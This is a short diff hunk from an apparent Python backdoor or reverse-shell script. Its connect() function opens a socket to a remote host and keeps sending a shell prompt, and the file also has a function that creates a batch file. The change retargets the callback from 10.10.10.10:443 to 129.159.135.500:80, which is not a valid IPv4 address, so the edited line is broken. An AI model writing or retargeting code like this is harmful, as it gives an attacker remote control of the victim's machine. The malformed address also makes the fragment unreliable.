@@ -19,7 +19,7 @@ def create_bat_file():
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('10.10.10.10', 443))
+    s.connect(('129.159.135.500', 80))
     while True:
         try:
             s.send(prompt().encode())
